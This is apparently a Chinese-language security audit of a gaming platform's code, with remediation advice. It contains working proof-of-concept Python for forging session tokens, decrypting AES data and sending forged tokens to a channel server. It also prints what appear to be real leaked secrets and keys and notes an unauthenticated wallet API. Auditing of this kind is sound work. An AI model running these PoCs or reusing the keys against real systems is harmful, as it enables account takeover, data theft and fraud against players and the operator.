# 逆向工程分析報告
## Reverse Engineering Analysis

---

## 目錄 Table of Contents

1. [執行摘要](#執行摘要)
2. [可分析資產清單](#可分析資產清單)
3. [token 系統逆向分析](#token-系統逆向分析)
4. [通訊協議推斷分析](#通訊協議推斷分析)
5. [加密機制分析](#加密機制分析)
6. [AES/MD5 金鑰暴露分析](#aesmd5-金鑰暴露分析)
7. [Bot/自動化漏洞分析](#bot自動化漏洞分析)
8. [協議模擬可行性](#協議模擬可行性)
9. [game_server 二進位分析需求](#game_server-二進位分析需求)
10. [風險評估](#風險評估)
11. [建議](#建議)
12. [缺失資訊](#缺失資訊)

---

## 執行摘要

在可存取的原始碼範圍內，已識別出多個**高危逆向工程/協議模擬漏洞**：

1. **自定義 Token 系統可被逆向偽造** — 算法公開、密鑰已洩露
2. **AES 加密金鑰已在 .env 中洩露** — 所有以此金鑰加密的資料可被解密
3. **內部 API 無認證** — 無需逆向即可直接呼叫
4. **game_server 通訊協議未知** — 無法完整評估

**Further analysis requires game_server source code.**

---

## 可分析資產清單

| 資產 | 類型 | 可逆向程度 |
|-----|------|---------|
| game_api Node.js 源碼 | JavaScript | ✅ 完全可讀 |
| dashboard Node.js 源碼 | JavaScript | ✅ 完全可讀 |
| game_record_parser | TypeScript (編譯前) | ✅ 完全可讀 |
| kysport | Next.js/TypeScript | ✅ 完全可讀 |
| dashboard-frontend (SPA) | Vue.js (Rspack 打包) | 🟡 可讀但混淆 |
| game_server | ❌ 原始碼不存在 | ❌ 無法分析 |

---

## token 系統逆向分析

### 自定義 Token 算法（已完全破解）

game_api 使用自定義 Token 系統，算法完全暴露在源碼中：

```javascript
// token.js - 完整算法已知
const createToken = function(data, timeout) {
    let payload = {
        data: JSON.stringify(data),     // ← 敏感資料僅 JSON 序列化
        created: parseInt(Date.now() / 1000),
        exp: parseInt(timeout) || 150
    };
    // Step 1: Base64 編碼 payload
    let base64Str = Buffer.from(JSON.stringify(payload), 'utf8').toString('base64');
    // Step 2: HMAC-SHA256 簽名
    let hash = crypto.createHmac('sha256', secret);  // secret = 'lc218.com'
    hash.update(base64Str);
    let signature = hash.digest('base64');
    // Token 格式: base64(payload).signature
    return base64Str + '.' + signature;
};
```

**已知所有要素**:
- 算法：HMAC-SHA256
- 密鑰：`lc218.com`（來自 `.env` TOKEN_SECRET）
- 格式：`base64(payload).hmac_signature`

**可偽造 Token 的 PoC（概念驗證）**:
```python
import base64
import hmac
import hashlib
import json
import time

def create_fake_token(account, agent, machine_name, secret='lc218.com', exp=3600):
    payload = {
        'data': json.dumps({
            'account': account,
            'agent': agent,
            'machineName': machine_name,
        }),
        'created': int(time.time()),
        'exp': exp
    }
    payload_str = json.dumps(payload)
    base64_str = base64.b64encode(payload_str.encode()).decode()
    
    sig = hmac.new(secret.encode(), base64_str.encode(), hashlib.sha256)
    signature = base64.b64encode(sig.digest()).decode()
    
    return f"{base64_str}.{signature}"

# 偽造任意帳號的有效 Token
fake_token = create_fake_token('target_player', 'agent001', 'server1')
```

**影響**: 若 TOKEN_SECRET 洩露（**已洩露**），攻擊者可偽造任意帳號的有效 Token，進入遊戲。

---

## 通訊協議推斷分析

### channel server (port 2090) 協議推斷

```javascript
// channel/init.js
httpServer.app.use('/', require('./routes/channelHandle'));
require('./service/channelService').loadData(serverConfig, () => { ... });
```

從 `gameHandle.js` 中確認的端點：
```javascript
router.post('/checkUserToken', gameController.checkUserToken);
router.post('/getUserToken', gameController.getUserToken);
router.post('/getPlayerInfoByAccount', ...);
router.post('/savePlayerInfo', ...);
router.post('/getRedirectServerInfo', ...);  // ← 可能是取得遊戲服務器地址
router.post('/syncAgentDesRoute', ...);
```

**推斷**: channel server 使用 **HTTP/HTTPS REST API**（Express.js），非 WebSocket。
玩家客戶端先呼叫 channel 獲得 Token 和遊戲服務器地址，再連線至 game_server。

### 第三方廠商接口協議

各廠商使用 HTTP 回調（Webhook）模式：
- 廠商 → 本系統 vendor server（1076-1105）POST 請求
- 本系統 → 廠商 API 伺服器（HTTP API）

**已知廠商認證方式**（從 .env 洩露）：
```
KYS: Host ID + Token Secret → HMAC 簽名
XPG: Host ID + Token Secret → HMAC 簽名
KYLab: API Key + Secret → HMAC 簽名
CSLay: Agent Token + Launch Secret → HMAC 簽名
Astar: Authorization Header
```

---

## 加密機制分析

### 整體加密使用情況

| 加密算法 | 使用位置 | 金鑰狀態 |
|--------|---------|---------|
| HMAC-SHA256 | 自定義 Token | 🔴 已洩露（lc218.com）|
| AES-128/256 | 資料加密（datadig、gameserver）| 🔴 已洩露 |
| MD5 | gameserver 通訊 | 🔴 已洩露 |
| bcrypt | 管理員密碼雜湊 | ✅ 安全 |
| TOTP（OTP）| 2FA | ✅ 安全 |
| JWT（HS256）| dashboard 登入 Token | 🟡 Secret 未確認是否安全 |
| crypto-js | 前端/後端資料加密 | 🟡 視金鑰而定 |

### AES 解密 PoC

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

# 金鑰來自 .env（已洩露）
AES_KEY = b'fd295FAGApiuDGLQ'  # 16 bytes = AES-128

def decrypt_data(encrypted_b64):
    data = base64.b64decode(encrypted_b64)
    cipher = AES.new(AES_KEY, AES.MODE_ECB)  # 假設 ECB 模式
    decrypted = unpad(cipher.decrypt(data), 16)
    return decrypted.decode('utf-8')
```

---

## AES/MD5 金鑰暴露分析

### 已洩露的金鑰清單

```
# 用途: 後台同桌玩家連結加解密
KEY_AES_DATADIG = 'fd295FAGApiuDGLQ'

# 用途: GameServer 通訊認證
KEY_GAMESERVER_MD5 = 'A53D3B55A0C85EB7'
KEY_GAMESERVER_AES = '9B1A999D5FF730D8'

# 用途: 海外橋接服務
KEY_OVERSEA_AES = '19bd4ca9711247f39b65b42a88bff4bc'

# 用途: 試玩模式
TRIAL_AGENT_AES = [unknown, from .env]

# 用途: Dashboard 登入
loginAesKey = 'fd295FAGApiuDGLQ'  # manage.config.js 硬編碼
```

### 風險影響

1. `KEY_GAMESERVER_AES/MD5` — 可能用於 game_server 通訊認證，若攻擊者知道這些金鑰，可偽造 game_api → game_server 的請求
2. `KEY_AES_DATADIG` — 同桌玩家連結被加密保護，但金鑰已洩露，可解密連結並分析玩家資料
3. `KEY_OVERSEA_AES` — 海外橋接服務認證金鑰洩露，可偽造請求到橋接服務

---

## Bot/自動化漏洞分析

### 已確認的 Bot 風險

#### 1. 無 CAPTCHA 的遊戲入口

```javascript
// channel server
router.post('/checkUserToken', ...);  // 無驗證碼
router.post('/getUserToken', ...);    // 無驗證碼
```

**風險**: 可自動化模擬玩家登入、查詢餘額、重複操作

#### 2. 速率限制可繞過

```javascript
// 僅有記憶體速率限制（20 points）
// PM2 cluster mode 多個 worker = 各自計算
```

#### 3. 遊戲結果自動化預測（推斷）

若 RNG 使用弱種子（如時間戳、可預測值），且協議可被模擬，Bot 可能：
1. 連線至 channel server 取得 Token
2. 持續投注並記錄結果
3. 統計分析 RNG 輸出模式
4. 在有利時機下注

**需要 game_server 源碼確認**

#### 4. 後台機器人監控（防禦）

系統已有反 Bot 機制：
```
dashboard-frontend/src/api/riskManagement/roomRobotMonitoring.js
dashboard-frontend/src/api/riskManagement/killManagement.js
```

但這是事後監控，非主動防禦。

---

## 協議模擬可行性

### channel server 模擬（高可行）

```
難度: ⭐⭐ (簡單)
理由:
- 完整 HTTP REST 接口（已知）
- Token 算法已洩露並可偽造
- 無 challenge-response 認證
```

**模擬步驟**:
```python
import requests
import json

# Step 1: 偽造 Token（使用已洩露的 TOKEN_SECRET）
token = create_fake_token('player001', 'agent001', 'game_server_1')

# Step 2: 呼叫 channel server
resp = requests.post('http://TARGET:2090/checkUserToken', json={
    'account': 'player001',
    'agent': 'agent001',
    'token': token,
    'bgServer': 'game_server_1'
})
```

### wallet server 模擬（非常高可行）

```
難度: ⭐ (極簡單)
理由:
- 完整 HTTP REST 接口（已知）
- 完全無認證
- 可直接 POST 存款/加分
```

### game_server 協議模擬

```
難度: ❓ (未知)
理由: game_server 原始碼不存在，無法評估
需要: 網路封包分析或源碼
```

---

## game_server 二進位分析需求

若 game_server 以二進位形式提供，建議執行以下分析：

### 靜態分析

```bash
# 提取可讀字串
strings game_server | grep -E '(port|host|secret|key|token|password)'

# 分析依賴
ldd game_server  # Linux
otool -L game_server  # macOS

# 分析導出符號
nm -D game_server

# 如果是 Node.js 打包（pkg/nexe）
# 嘗試解包
npx pkg-fetch  # 分析打包結構
```

### 動態分析

```bash
# 系統呼叫追蹤
strace -e trace=network,file -p $(pidof game_server)

# 網路流量分析
tcpdump -i lo -w game_server_traffic.pcap 'port 80 or port 443'

# Frida 插樁（若為 Node.js）
frida game_server -l intercept_crypto.js
```

### 協議逆向

```
分析優先順序:
1. 連接建立握手
2. 認證流程
3. 遊戲指令格式
4. 結果回應格式
5. 心跳機制
6. 加密算法識別
```

---

## 風險評估

| 風險 | 嚴重度 | 可行性 | 說明 |
|-----|-------|-------|------|
| Token 偽造 | CRITICAL | 高 | Secret 已洩露，算法已知 |
| Wallet API 直接操控 | CRITICAL | 高 | 無認證 |
| AES 資料解密 | HIGH | 高 | 金鑰已洩露 |
| 廠商 API 偽造 | HIGH | 中 | 需各廠商 Secret |
| 協議自動化 Bot | HIGH | 中 | 需分析 game_server |
| 封包重放攻擊 | HIGH | 中 | 需確認序列號機制 |
| RNG 預測 | MEDIUM | 低（未確認）| 需 game_server 源碼 |

---

## 建議

### 立即修復

1. **輪換所有加密金鑰**（TOKEN_SECRET、AES 金鑰）
2. **內部 API 加入認證**（防止直接呼叫 wallet/deposit）
3. **Token 系統改用 JWT 標準**（RS256 非對稱加密）

### 短期修復

4. **引入 challenge-response 認證**（防止簡單 Bot）
5. **加入 nonce/序列號**（防止封包重放）
6. **使用 constant time comparison**（防止 timing attack）

### 長期改善

7. **game_server 通訊改用 mTLS**
8. **引入 Provably Fair 機制**（RNG 可驗證）
9. **定期滲透測試**（每季一次）

---

## 缺失資訊

1. **game_server 原始碼/二進位** — 最關鍵缺失
2. **客戶端程序** — 遊戲客戶端源碼/APK/IPA
3. **WebSocket 流量樣本** — 若 game_server 使用 WS
4. **Protobuf 定義文件** — 若使用 Protobuf
5. **完整的 game_server 日誌** — 分析行為模式
